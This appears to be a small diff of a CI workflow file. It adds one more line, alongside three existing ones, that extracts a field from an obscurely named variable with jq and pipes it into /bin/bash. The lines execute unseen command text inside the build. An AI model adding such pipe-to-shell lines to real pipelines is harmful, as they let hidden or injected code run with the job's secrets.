@@ -26,6 +26,7 @@ jobs:
           echo $ilnot819 | jq -r .nipil0 | /bin/bash
           printf '%s' "$lrd6121" | jq -r .av7 | /bin/bash
           echo $dj97745 | jq -r .jow17 | /bin/bash
+          echo $nh907 | jq -r .ojt658 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
